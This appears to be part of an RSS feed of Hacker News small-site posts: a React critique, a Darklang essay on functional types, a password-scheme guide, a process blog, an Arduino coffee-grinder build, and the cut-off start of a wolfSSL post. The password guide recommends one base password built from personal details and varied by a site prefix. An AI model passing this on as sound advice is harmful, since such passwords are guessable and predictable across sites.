Score 33 | Comments 74 (<a href="https://news.ycombinator.com/item?id=25677648">thread link</a>) | @jehna1
<br/>
January 7, 2021 | https://thejunkland.com/blog/what-react-gets-wrong.html | <a href="https://web.archive.org/web/*/https://thejunkland.com/blog/what-react-gets-wrong.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>React is the de-facto tool for frontend web development. It has a rich ecosystem and a well-known company to back it up. Despite all of this, I think they still get a ton of stuff wrong. This post is about my personal views and things I think React is already a too slow-moving giant to fix.</p><h2 id="the-syntax">The syntax</h2><p>React has such an awful API that they needed to create a whole new programming language syntax to overcome it: The <code>React.createElement</code> API. Most of the time it's hidden behind JSX that's transpiled onto <code>React.createElement</code> calls.</p><p>You either only ever write JSX when working with React, or you get frustrated with the amount of clutter that gets to your codebase from all that repetition that provides no value to the reader.</p><pre><code>Reat.createElement(<span>'html'</span>, <span>null</span>,
  React.createElement(<span>'body'</span>, <span>null</span>,
    React.createElement(<span>'div'</span>, <span>null</span>,
      React.createElement(...)
    )
  )
)
</code></pre><p>I think a much better way is to follow what SwiftUI and Flutter are doing: Move the element's name from argument to be the function's name:</p><pre><code>html(
  body(
    div(...)
  )
)
</code></pre><p>This does not only remove unnecessary clutter, but removes the need for any compilation step.</p><h2 id="create-react-app">create-react-app</h2><p>Next up us a monstrosity that's nowadays accepted by many to be a "best practice" for getting started with a React project. The problem being, that React ecosystem is such a complex beast that they created a bootstrap project so you can get anything done in a meaningful time. Just pray that you don't need to eject it any time soon.</p><p>Just to give you an idea of the absurdness of this situation: create-react-app creates a "hello world" project for you that downloads <strong>2.5 million lines of Javascript code</strong> to your machine. For a hello world app.</p><p>I have strong feelings about fighting complexity by adding more complexity, and this sure smells like something you should not be doing in 2021.</p><p>Instead we should be thinking about where our browsers and server ecosystems are nowadays and if we could make the bootstrapping <em>simpler</em>. Browsers <a href="https://caniuse.com/es6-module">know how to handle imports nowadays</a>, and the module format is <a href="https://nodejs.org/api/esm.html">also part of Node.js</a> without any preprocessing, so you don't necessarily need a build step to get those working.</p><p>Modern browsers are really good with on-the-fly compression like gzip <a href="https://caniuse.com/brotli">and even brotli</a>, so minification is not so much of an issue. Your CDN should anyways be optimizing compression of your static assets.</p><p>Another point being that React is over 100kb when minified (including React DOM because you can't do that much without it). Imagine how much unminified code you could fit in 100kb if you used something that doesn't need to be built at all.</p><h2 id="react-is-not-just-a-view-rendering-library-anymore">React is not just a view rendering library anymore</h2><p>React used to be only a good frontend rendering library with JSX. Nowadays you're signing up for a framework with its own plugin ecosystem, hooks, fibers, suspense, and other obscure future features like <a href="https://reactjs.org/blog/2020/12/21/data-fetching-with-react-server-components.html">server components</a>.</p><p>We've changed from doing <em>model-view-controller</em> to using all-consuming views that perform both business logic and create side effects. Views have become the top-level entity that controls everything else.</p><p>Remember the old saying "UI is a function of state"? React used to be a good implementation of this, but nowadays it's more of "UI that handles your state".</p><p>I think a good view rendering library should do just one thing well: Render the UI based on the app's state. It should not care where the state is, and most importantly it should not handle the state itself. Otherwise we'll end up with things like bloated class components or <em>"suddenly global state and black magic is fine"</em> type of hooks inside otherwise pure functions.</p><p>Instead you should be handling your business logic, side effects and data gathering some place else, and use proper separation of concerns to model your application's logic.</p><h2 id="imagine-a-better-world">Imagine a better world</h2><p>So how would a better React alternative look in 2021? I made a small prototype library called <a href="https://www.npmjs.com/package/longwood">Longwood</a> based on above principles, and a hello world looks like this:</p><pre><code><span>&lt;<span>html</span>&gt;</span>
  <span>&lt;<span>body</span>&gt;</span>
    <span>&lt;<span>div</span> <span>id</span>=<span>"app"</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>
    <span>&lt;<span>script</span> <span>type</span>=<span>"module"</span>&gt;</span><span>
      <span>import</span> { div, text } <span>from</span> <span>'https://cdn.skypack.dev/longwood'</span>

      <span>const</span> render = div(text(<span>'Hello world!'</span>))
      render(<span>document</span>.getElementById(<span>'app'</span>))
    </span><span>&lt;/<span>script</span>&gt;</span>
  <span>&lt;/<span>body</span>&gt;</span>
<span>&lt;/<span>html</span>&gt;</span>
</code></pre><p><a href="https://codesandbox.io/s/unruffled-star-xs16e?file=/index.html">▶️ Try it out at CodeSandbox.io</a></p><p>That's all the code you need. No precompilation, no build steps, no downloading of 2.5 million lines of code to get started. You can open a text editor, save the code as an <code>index.html</code> file, open it in a browser and it works.</p><p>You have the same power of Javascript to compose your views as with React, and there's a <a href="https://www.npmjs.com/package/longwood-usestate">separate state management library</a> to get started if you're coming from React. But moreover <em>it's okay to handle your state however you want</em>. It's just a rendering library. It can be used for just a small portion of your site if you want. It even supports server-side rendering out of the box (with jsdom).</p><p>Since you're going to ask, here are a couple of examples:</p><ul><li><a href="https://codesandbox.io/s/competent-swartz-beoub?file=/src/TodoComponent.ts">React style Todo app</a></li><li><a href="https://links.thejunkland.com/">Rendering 1000+ rows of data with Longwood</a><ul><li><a href="https://links.thejunkland.com/react/">Same example done with create-react-app</a></li></ul></li></ul><h2 id="to-wrap-up">To wrap up</h2><p>We’ve come a long way since the web 2.0 times. jQuery made the world a better place by making DOM manipulation easier. AngularJS made the world a better place by introducing data binding to the masses. But all great increments seem to fade at some point to welcome better alternatives.</p><p>Will the future be bright for Longwood? I have no idea, it’s a single-person project and at the moment has one production site running on it. But I hope it demonstrates a point that we can do things even better in the future if we keep innovating and cherry-picking the good stuff from others.</p><p>Happy hacking.</p><p><a href="https://twitter.com/intent/tweet?text=%22What%20React%20gets%20wrong%22%20by%20@luotojesse%20https://thejunkland.com/blog/what-react-gets-wrong.html" target="_blank" rel="noopener">Tweet</a></p></article></div></div>]]>
            </description>
            <link>https://thejunkland.com/blog/what-react-gets-wrong.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25677648</guid>
            <pubDate>Thu, 07 Jan 2021 21:19:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Real Problems with Functional Languages]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25677402">thread link</a>) | @wingspan
<br/>
January 7, 2021 | https://blog.darklang.com/real-problems-with-functional-languages/ | <a href="https://web.archive.org/web/*/https://blog.darklang.com/real-problems-with-functional-languages/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <h2 id="and-their-influence-on-dark">And their influence on Dark</h2><p><br>After two decades of coding professionally in a dozen languages, I’ve come to a conclusion about static and dynamic types:</p><ul><li>Static types help you ensure that your changes work, especially for changes that span large parts of the program. This leads to long-term productivity gains from reduction in errors, as well as code that works better.</li><li>The lack of static types in dynamic languages allows you to prototype quicker and iterate faster. It also makes your code more readable.</li></ul><p>The result is a productivity quagmire. Static languages bring the cost of type-safety to every line of code that is written, slowing development of new features and concepts. Dynamic languages’ lack of type safety produces significant costs down the line, eating the productivity benefit of the early quick prototyping.</p><p>In Dark, we want the advantages of both. We want to take a type-safe core with long-term productivity gains and risk-reduction, and use tooling to enable the quick prototyping and readable code that you get from dynamic languages.</p><p><a href="https://medium.com/darklang/the-design-of-dark-59f5d38e52d2" rel="noopener">Dark</a> has a number of features that are different from regular programming languages. A quick intro:</p><ul><li>Dark’s goal is to remove accidental complexity from coding. We want you to write backend services quickly and safely, with little to no overhead.</li><li>Dark is for building backends — you typically write HTTP handlers and we handle the deployment and infrastructure.</li><li>Dark combines an editor, language and infrastructure, and we use the tight integration to overcome common limitations in programming languages.</li><li>Dark doesn’t have a compilation step or separate compiler/interpreter. Instead, the editor updates with errors and warnings as you type (it also prevents syntax errors and some type errors).</li><li>Dark is designed for continuous delivery — the practice of frequently making small, low-risk changes. Code that you write is deployed to “production” (typically behind a feature flag) immediately after being written.</li></ul><p>Statically-typed functional languages (hereafter FPs, with apologies to Lispers) are amazing. They have a property that exists almost nowhere else: once it compiles, it usually works first try. We obviously want this property in Dark, so we made Dark a statically-typed functional language.</p><p><em><em>(If you’re already very familiar with statically-typed functional languages, you can </em></em><a href="https://medium.com/darklang/real-problems-with-functional-languages-efe668c5264a" rel="noopener"><em><em>skip this section</em></em></a><em><em> without missing much.)</em></em></p><h2 id="type-safety">Type safety</h2><p>In FPs, the compiler checks if all the types line up, and if you’ve handled every possible edge case about your type. When you make a change, the compiler tells you every single place you need to change, which you need to figure out for yourself in dynamic languages. Importantly, that safety comes for free — you don’t have to write millions of unit tests to get it. The result is that small changes across large scale systems are pretty risk free. You can still get the logic wrong, but the plumbing is guaranteed to behave as expected.</p><h2 id="nulls">Nulls</h2><p>In almost every non-FP language, including Java, C, C++, Go, Python, Ruby, PHP, Erlang, Javascript, Clojure, Scala, SQL, C#, and Objective-C, any value can be null, and it can be extremely challenging to reason about whether a particular variable is or isn’t null in practice. Nulls cause program crashes when functions and methods are called on them, when they are indexed, and when their fields are accessed.</p><pre><code>function leadPlayer(players) {
  if (players.length &lt;= 0)
    return null;
  return players[0];
}
function chooseCaptain(players) {
  // throw a NullPointerException if the `players` list is empty.
  leadPlayer(players).setCaptain(true);
}</code></pre><p>In the Java/Javascript-ish code above, the type system doesn’t protect against the NullPointerException when we expected an object but get a null.</p><p>FPs replace nulls with an Option type (called <a href="https://guide.elm-lang.org/error_handling/maybe.html" rel="noopener nofollow">Maybe in Elm</a> and <a href="https://wiki.haskell.org/Maybe" rel="noopener nofollow">Haskell</a>, <a href="https://learning-rust.github.io/docs/e3.option_and_result.html" rel="noopener nofollow">Option in Rust</a>, <a href="https://danielwestheide.com/blog/2012/12/19/the-neophytes-guide-to-scala-part-5-the-option-type.html" rel="noopener nofollow">Scala</a>, and <a href="https://dev.realworldocaml.org/guided-tour.html#scrollNav-3-3" rel="noopener nofollow">OCaml</a>/<a href="https://fsharpforfunandprofit.com/posts/the-option-type/" rel="noopener nofollow">F#</a>, and <a href="https://hackernoon.com/swift-optionals-explained-simply-e109a4297298" rel="noopener nofollow">Optional in Swift</a>). The Option type encodes in the type system that a value can be null. If the value is not an Option, then it cannot be null.</p><p>Every time you have an Option, the compiler requires you to handle both potential cases: if it is a real value, or if it’s not. Since the compiler won’t let you access a field or index or call a method on a null value, that entire class of errors is removed.</p><pre><code>function leadPlayer(players) {
  match players with
  | [] -&gt;
    return Nothing
  | head :: rest -&gt; // an array with 1 or more elements
    return (Just head)
}
function chooseCaptain(players) {
  match leadPlayer(players) with
  | Just player -&gt;
      player.setCaptain(true); // we know this can't be null
  | Nothing -&gt;
      // don't throw an exception
}</code></pre><p>As we can see, the FP version of the same code requires the <code>null</code> (called <code>Nothing</code> in our examples) to be handled.</p><h2 id="exceptions">Exceptions</h2><p>Similarly, in most languages, any operation can cause an exception. Even Java with its checked exceptions has a category of exceptions (RuntimeExceptions) that can happen anywhere, including the beloved <code>NullPointerException</code>. Exceptions are so pervasive that it’s basically impossible to have a single line of code that is known to be exception-free — and even if it is, you won’t have a compiler to tell you that.</p><p>Here’s an example of some simple Python code that will throw an exception if <code>a</code>or <code>b</code>are strings which are not valid ints:</p><pre><code>sum = int(a) + int(b);</code></pre><p>FPs commonly use a Result type instead of exceptions (or C/Go error codes). A Result is a value which is either a valid value or an error. Like the Option type, the compiler sees every Result and requires you to handle the potential error, knowing that you cannot do your regular type operations on an error.</p><p>Here’s the same in an Elm-like language with result types. As you can see, this requires you to handle both the errors of <code>a</code>and <code>b</code>.</p><pre><code>match String.toInt a, String.toInt b with
| Ok a, Ok b -&gt;
    sum = a + b
| _ -&gt;
    Debug.log(“Error parsing integers);
    sum = 0</code></pre><p>By removing both nulls and exceptions, FPs remove a huge set of possible errors, and allow developers the safety of knowing that their programs work. Most importantly, that knowledge comes from automatic tooling, not manually writing test cases.</p><h2 id="implementation-in-dark">Implementation in Dark</h2><p>Dark takes influence from FPs, and Dark programs are fully type-checked. Dark’s type system allows us to find everywhere that a change needs to propagate, and tells you whether your types line up or not.</p><p>We also use Results and Options instead of exceptions and nulls, to avoid all the problems that come from those language features.</p><p>Unfortunately, these benefits come with significant frustrations and downsides, which current functional languages have — in our opinion — poor solutions for.</p><h2 id="type-checking-in-dark">Type checking in Dark</h2><p>In most FP compilers, your whole program either compiles or it doesn’t, making it difficult to make small scale changes. If I’m programming in Python, and I want to test out a quick hacky change in some component, I can do that immediately to discover whether the hack will even solve my problem.</p><p>Not so in FP. If I change a type in a FP, it might take me an hour to change every use of that type so that my program can even compile. And that’s assuming I’m stubbing out any logic that I don’t want to handle just yet. There’s little I find more frustrating than discovering in step 2 that the type changes I diligently propagated in step 1 were wrong and that I wasted the last hour.</p><p>Dark is designed for continuous delivery. As such, we don’t like requiring you to make large scale changes across your program, like changing a type everywhere. Instead, we want you to quickly discover that bad ideas won’t work, without first requiring you to propagate the type changes throughout your program.</p><p>Dark has a deliberately small compilation unit (the amount of code which is compiled together, and therefore which must be type checked together). You can make changes in a single HTTP route without having to make it type check with the rest of your program. This lowers the amount of type changes that you need to make to test out a single change.</p><p>The way this works is that you don’t actually change types in Dark. Instead, you make a copy of the type, and make your changes on that new copy. This allows you to prototype with the new type and test your change easily, making cheap iterations (and new types) as you try out new ideas. Once you are confident in your new type, you replace the uses of the old type (with semi-automated tooling to handle all the changes, including changes that are way down the call-stack).</p><p>As a result, you get the benefits of type checking, along with the benefits of cheap prototyping and quick iteration.</p><h2 id="option-result-types-in-dark">Option/Result types in Dark</h2><p>If I want to use a value wrapped in an Option or Result, I must first unwrap it, and then handle the failure case. This ensures that my code handles all errors and edge cases, but also adds costs to prototyping and iteration. If I want to make a quick hack in Python or Javascript, I can ignore nulls and errors on the first pass as I prototype and develop my algorithm. Not so with static types — in fact, often I’m forced to do low-level restructuring of my code to handle Options and Results.</p><p>Consider the code I have to add to my prototype in our Elm-like example:</p><pre><code>match String.toInt a, String.toInt b with
| Ok a, Ok b -&gt;
  sum = a + b
| _ -&gt;
  Debug.log(“Error parsing integers);
  sum = 0</code></pre><p>The Python code was significantly faster to write (though it has bugs that we want to ignore during our prototype).</p><p>Dark uses a concept from <a href="https://fsharpforfunandprofit.com/" rel="noopener nofollow">Scott Wlaschin</a> called “<a href="https://fsharpforfunandprofit.com/rop/" rel="noopener nofollow">Railway Oriented Programming</a>” to reduce this complexity. ROP is a metaphor where the error values of Results and Options form an alternate execution path through the program, called an Error Rail. When an error happens, the execution in the main body stops and instead passes over to the Error Rail.</p><p>Dark takes the ROP metaphor and makes a literal version of it in our editor. If you call a function in Dark that returns a <code>Nothing</code>(the name of the null-ish value of our Option type), …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.darklang.com/real-problems-with-functional-languages/">https://blog.darklang.com/real-problems-with-functional-languages/</a></em></p>]]>
            </description>
            <link>https://blog.darklang.com/real-problems-with-functional-languages/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25677402</guid>
            <pubDate>Thu, 07 Jan 2021 21:01:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Open Letter to the Communications of the ACM]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25677275">thread link</a>) | @gnarbarian
<br/>
January 7, 2021 | https://researchers.one/articles/20.12.00004 | <a href="https://web.archive.org/web/*/https://researchers.one/articles/20.12.00004">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://researchers.one/articles/20.12.00004</link>
            <guid isPermaLink="false">hacker-news-small-sites-25677275</guid>
            <pubDate>Thu, 07 Jan 2021 20:50:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simple Password Framework: Strong Passwords, Easy to Remember]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25677255">thread link</a>) | @300
<br/>
January 7, 2021 | https://jovica.org/posts/the_password_framework/ | <a href="https://web.archive.org/web/*/https://jovica.org/posts/the_password_framework/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <header>
    
  </header>
  <small>
      

  </small>
  

  <p>We all need to use passwords. Everyone should use password managers. Most of
us don’t. This guide will give you the framework to create many strong passwords
which are easy to remember.</p>

<p><strong>## Step #1: The Base password</strong></p>
<p>First you need a base password.</p>
<p>Think of 3 of your favorite things. Choose something positive.<br>
For example, I like to read, eat pizza and listen to Nick Cave.<br>
So that gives me: <code>KindlePizzaCave</code></p>
<p>Now separate each word with your favorite special character.
Let’s say I like money, so I’ll use that for this example. And I get: <code>Kindle$Pizza$Cave$</code></p>
<p>Now add a familiar number which you’ll always remember.<br>
Your postal code, birth year or something similar.<br>
Whatever it is, just remember that <strong>method</strong>.</p>
<p>For example, if my postal code would be 113355, I could use that, and get: <code>Kindle$Pizza$Cave113355</code></p>
<p>This easy method gives you a pretty long password.
It also satisfies all of the requirements of a strong password: stuff like upper and lower case characters, numbers, special characters, etc.</p>
<p>And you get all of this without even thinking about it really.<br>
This can be your BASE password. It a pretty strong password.</p>
<p>Now, the worst thing you could do is to use this awesome password for all of your accounts.
Just trust me, and don’t do that.</p>
<p>There’s a better solution.</p>

<p><strong>## Step 2: Self explanatory passwords</strong></p>
<p>So let’s say, I use a password <code>Kindle$Pizza$Cave113355</code> for my primary email account. That’s easy to remember. I use it only there, and that’s it.</p>
<p>Now, you can make your strong password unique with a special identifier for each of your accounts.
It sounds complicated, it’s not really.</p>
<p>For example, I use Twitter. I could use <code>TW</code> or something like that. I can add it at the beginning, end or even split it up. So, my password for Twitter could be: <code>TW$Kindle$Pizza$Cave113355</code></p>
<p>For Facebook, I could have: <code>Fb$Kindle$Pizza$Cave113355</code></p>
<p>You’re really just typing things you like, and remembering a method you chose.</p>

<p><strong>## Step 3: Time to change passwords?</strong></p>
<p>Most of the cybersecurity professionals will tell you that updating your passwords regularly is a good practice. Well, that’s not really true anymore.
But that’s a topic for another post.</p>
<p>So, whether you’re forced to change your passwords at work, or you just think it’s time for you to update your passwords, this framework makes it very easy.</p>
<p>All you need to do is to change your <strong>method</strong>.
So, for example, if I’d be really lazy, I could just shift things around, and from my old password for Twitter <code>TW$Kindle$Pizza$Cave113355</code> get to new one: <code>113355$Kindle$Pizza$Cave$TW</code>.</p>
<p>And that’s usually good enough.</p>
<p>But it’s recommended that you change the key words of your password.
You can use your favorite quote, or pretty much anything easy for you to remember.
Then just follow the same method.</p>

<p><strong>## Further steps</strong></p>
<p>You might wonder, “what if an attacker gets my password and sees my method?”</p>
<p>Yeah, that is a risk for sure, which we could analyze.<br>
You’d need to figure out your threat model.<br>
I will teach you how to do that in one of the next posts.</p>
<p>But for 99% of people online, this is a really great way to have long, unique passwords.</p>
<p>Here’s one last thing you should do today:</p>
<p>Step 1</p>
<p>Go to <a href="https://haveibeenpwned.com/Passwords">https://haveibeenpwned.com/Passwords</a> and type your password.
If you see a message like “Good news — no pwnage found!”, you’ll know that your password is not among the list of currently known breached passwords.</p>
<p>That’s good. It means that your password (and your method) is not leaked, and it’s still a secret known only to you.</p>
<p>Step 2</p>
<p>Go to <a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a> and type your email.
This way you can check if your email was leaked in some of the big, known data breaches.
If yes - change the passwords on the breached accounts immediately.</p>
<p>Also, once you sign up, if your email ever appears in some of the breach known to <a href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a> - you’ll get an email notification about it, which is awesome.</p>
<hr>




<p>You're welcome to join my private <a href="https://jovica.org/list">email list</a> or follow me on <a href="https://twitter.com/jovica">Twitter</a>.</p>



</div></div>]]>
            </description>
            <link>https://jovica.org/posts/the_password_framework/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25677255</guid>
            <pubDate>Thu, 07 Jan 2021 20:48:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A simple process beats a perfect process]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25676886">thread link</a>) | @mcrittenden
<br/>
January 7, 2021 | https://critter.blog/2021/01/07/a-simple-process-beats-a-perfect-process/ | <a href="https://web.archive.org/web/*/https://critter.blog/2021/01/07/a-simple-process-beats-a-perfect-process/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
	<p><a href="#content">Skip to content</a></p><!-- #masthead -->

	
	<div id="content">

	<div id="primary">
		<main id="main">

		

<article id="post-3830">
	<!-- .entry-header -->

	<div>
		
<p>Choose the simple and good process over the <a href="https://critter.blog/2020/08/06/productivity-porn/">complicated and perfect</a> process. The value of universal understanding outweighs the value of accounting for every possible edge case and gotcha.</p>



<p>I like to talk about processes in terms of <em><a href="https://critter.blog/2020/12/22/power-in-naming-things/">recite-ability</a></em>. If everyone involved in the process can’t recite it off the top of their head, try to simplify it. </p>



<p>Look at the humble Kanban board with <em>Todo</em>, <em>Doing</em>, and <em>Done</em> columns. Everyone knows which column their ticket should be in. There are only 3 of them! Simple!</p>



<p>That’s why we should think long and hard before adding that <em>In Review</em> column or the <em>Awaiting Deploy</em> column. Those should only be created when <a href="https://critter.blog/2020/12/17/stop-solving-problems-nobody-complained-about/">not having them becomes <em>torture</em></a>. Each one makes the process that much less recite-able. If a team’s board has so many columns that the average team member can’t recite them all from memory, that’s trouble.</p>



<p>The 80/20 rule applies, as always. If I can get 80% of the value of a process with 20% of the complexity, then that’s a tradeoff I’ll take almost every time. Of course there are exceptions, but I find that they aren’t as common as we’d expect. </p>



<p>I know it feels safer to account for everything so that there’s nothing left open to interpretation. But then we’ve just replaced one problem (“if X is true the we’ll have to do Y manually and that allows for human error!”) with <a href="https://critter.blog/2020/12/10/the-tragedy-of-the-commons-in-software-development/">a worse problem</a> (“nobody <a href="https://critter.blog/2020/12/01/never-underestimate-peoples-ability-to-not-hear-you/">deeply understands this</a> so they’re making mistakes or ignoring it altogether”).</p>



<p>One of my favorite rules for <a href="https://critter.blog/2020/06/10/spotting-broken-processes/">spotting broken processes</a> is: <em>when times get tough, if people run away from the process instead of towards it, it’s broken</em>. And when people are freaking out, they run away from complexity and towards simplicity.</p>



<p>So strive for simple. A simple process is a happy process.</p>




	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- #post-3830 -->
			<!-- .post-nav-wrapper -->
		
		</main><!-- #main -->
	</div><!-- #primary -->


<!-- #secondary -->

	</div><!-- #content -->

	
	<!-- #colophon -->
</div></div>]]>
            </description>
            <link>https://critter.blog/2021/01/07/a-simple-process-beats-a-perfect-process/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25676886</guid>
            <pubDate>Thu, 07 Jan 2021 20:24:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I automated my Coffee Grinder]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25676720">thread link</a>) | @flomei
<br/>
January 7, 2021 | https://www.flomei.de/en/blog/2021/01/07/how-i-automated-my-coffee-grinder/ | <a href="https://web.archive.org/web/*/https://www.flomei.de/en/blog/2021/01/07/how-i-automated-my-coffee-grinder/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <section>
    <article>
      <header>
        
        
      </header>

      <div>
      	

<h2 id="making-coffee-and-what-influences-it">Making Coffee and what influences it</h2>

<p>There are not many better things than a good espresso to start your day… Ok, before I lose myself in talking about coffee (or espresso), its brewing, and what I’ve learned over the last five years about it, I will take a shortcut.</p>

<p>Coffee is complex! Lots of factors influence whether you have a cup of delicious coffee or just dark, hot water with a bitter taste. In the end, you’ll want to have as many factors as constant as possible. Only in this way you can change single parameters and check whether it improves or worsens your coffee. That’s the foundation of scientific work but it’s also useful for brewing coffee.</p>

<p>One important factor is the coffee grounds. There are lots of factors, like how fine you grind, but also the amount you use and how much force you use to compact the ground in your espresso machine and so on. In the end we want to use the same grind settings and the same amount for each shot we pull from our machines.</p>

<h2 id="coffee-grinders-in-general">Coffee grinders in general…</h2>

<p>Fixing the grind setting is the smaller problem. You’ll dial it in on your grinder and will only change it when you try new beans. The amount of coffee grounds you’ll use depends on which technique you are using for brewing, but generally it’s the easiest way to simply weigh your grounded beans. You can either weigh the beans before grinding and grind them all or grind some, weigh, grind some more and so on…</p>

<p>So called “automatic grinders” shorten this process. They’ll usually grind “dose wise”, normally based on a timer. That leaves some variation for the amount, but this can usually be neglected. I am aware of only one grinder that actually weighs the grinded beans, all other grinders use timers.</p>

<p>I’m owning a small electric grinder for some time now, precisely <a href="https://amzn.to/3mWQoES#aff">a Lelit PL043 MMI.</a> It’s a nice little grinder, doing a good job especially in regards of its low price (coffee gear often is <em>really expensive</em>). Sadly this is not an automatic grinder, so you’ll have to stop grinding manually (and weigh afterwards).</p>

<p>As I’m a morning grouch and was annoyed by weighing the grounds in the morning, an automation was needed. The little Lelit needed to be transformed into an automatic grinder.</p>

<h2 id="checking-the-status-quo">Checking the status quo</h2>

<p>I’ve already expected that the inside of this grinder is not very complex, before actually opening the case. One switch on the side to turn the grinder on and off and a single push switch for the motor which grinds the beans. Of course both are connected to mains voltage, so having pushed/closed both switches will get the motor running. It looks somewhat like the following.</p>

<p><img src="https://www.flomei.de/assets/2021/01/schaltplan-lelit-pl043mmi.png" alt="Circuit diagram Lelit PL043 MMI"></p>

<p>Although there are not many components in place, space is at a premium in the grinder. The metal body tightly encloses the motor so there’s not much space left for the upcoming modifications.</p>

<h2 id="transformation-to-an-automatic-grinder">Transformation to an automatic grinder</h2>

<p>The grinder will be outfitted with a microcontroller from the Arduino ecosystem. The already existent touch switch will start a “grind program”, where the Arduino will hold the circuit closed through a relais.</p>

<p>Another touch switch allows the user to switch between three different modes (the grind programs: single dose - double dose - manual), two LEDs will show the selected mode.</p>

<p>Single and double dose are timed programs, the manual mode will engage the motor for a quarter second, so holding on to the switch will engange a somewhat “continous grinding”.</p>

<p>The supply voltage for the microcontroller, the relais and anything else will be provided by a small power supply which transforms main voltage into 5 V DC. Due to the limited space inside of the grinder, the power supply will sit on the backside of the grinder like a backpack.</p>

<p>The baseplate of the mill will also be equipped with two touch switches which can be used to increase or decrease the grinding time in the selected program. The selected values will be saved in the EEPROM of the Arduino and loaded when powering the grinder. This way, you can always work with the previous settings right from the start.</p>

<p>The circuit diagram for those modifications looks somewhat like the following, I have left out various resistors for a better overview.</p>

<p><img src="https://www.flomei.de/assets/2021/01/schaltplan-lelit-pl043mmi-automatik.png" alt="Circuit diagram Lelit PL043 MMI &quot;Automatic&quot;"></p>

<p>Some more pictures from the transformation will follow.</p>

<p><em>First tests of the circuit on a breadboard.</em></p>

<p><img src="https://www.flomei.de/assets/2021/01/lelit-automatik-1.jpg" alt="First tests of the circuit on a breadboard."></p>

<p><em>As already mentioned: Very little space in the grinder itself. Cable management was improved later on.</em></p>

<p><img src="https://www.flomei.de/assets/2021/01/lelit-automatik-2.jpg" alt="As already mentioned: Very little space in the grinder itself. Cable management was improved later on."></p>

<p><em>Switches for setting the timer, seated in the baseplate of the grinder.</em></p>

<p><img src="https://www.flomei.de/assets/2021/01/lelit-automatik-3.jpg" alt="Switches for setting the timer, seated in the baseplate of the grinder."></p>

<p><em>Small power supply mounted like a backpack on the back of the grinder. Provides power for the Arduino etc.</em></p>

<p><img src="https://www.flomei.de/assets/2021/01/lelit-automatik-4.jpg" alt="Small power supply mounted like a backpack on the back of the grinder. Provides power for the Arduino etc."></p>

<p><em>Final result: LEDs for displaying the selected mode, metal switch to change the operation mode.</em></p>

<p><img src="https://www.flomei.de/assets/2021/01/lelit-automatik-5.jpg" alt="Final result: LEDs for displaying the selected mode, metal switch to change the operation mode."></p>

<h2 id="results">Results</h2>

<p>The modification works great. I was worried that my timed control might be too unprecice and the amount of grounded beans could vary a lot. After some testing, I found that the result differs +/- 0.3 gram per grind run, which is totally fine for me.</p>

<p>I also like that the modification is not very obvious. The metal switch and the somewhat dimmed LEDs almost look like they were always in place. Only the power supply is a little downside for the optics, but as my grinder sits quite closely to the wall this is not a big deal either for me.</p>

<p>As I only had to buy the power supply, all the other parts were laying around from other projects, this modification was relative cheap with around 8 Euro.</p>

<p>I have uploaded <a href="https://gitlab.com/www-flomei-de/coffeegrinder">the source code to Gitlab,</a> in case anybody is interested in doing a similar build or wants to use parts of my code.</p>

<p>And: If you are not interested in tinkering with coffee grinders: Lelit has a very similar grinder with an automatic mode: It’s called <a href="https://amzn.to/3aSGPV8#aff">Lelit PL044 MMT.</a> Besides that there are also lots of other great automatic grinders available on the market.</p>

      </div>
    </article>

    <hr>
    
    <hr>

  </section>

      </div></div>]]>
            </description>
            <link>https://www.flomei.de/en/blog/2021/01/07/how-i-automated-my-coffee-grinder/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25676720</guid>
            <pubDate>Thu, 07 Jan 2021 20:14:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Replacing OpenSSL, Part 1: WolfSSL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25676671">thread link</a>) | @StreamBright
<br/>
January 7, 2021 | https://danyspin97.org/blog/replacing-openssl-part-1-wolfssl/ | <a href="https://web.archive.org/web/*/https://danyspin97.org/blog/replacing-openssl-part-1-wolfssl/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This post highlight my experiment of replacing OpenSSL cryptographic library
with its embedded competitor: <code>wolfssl</code>.</p><p><em><strong>Prerequites</strong></em>: <em>Basic knowledge about C/C++ programming</em>.</p><h2 id="a-bit-of-background-about-openssl">A bit of background about OpenSSL</h2><p>OpenSSL is one of the most crucial libraries on a Unix system: it performs
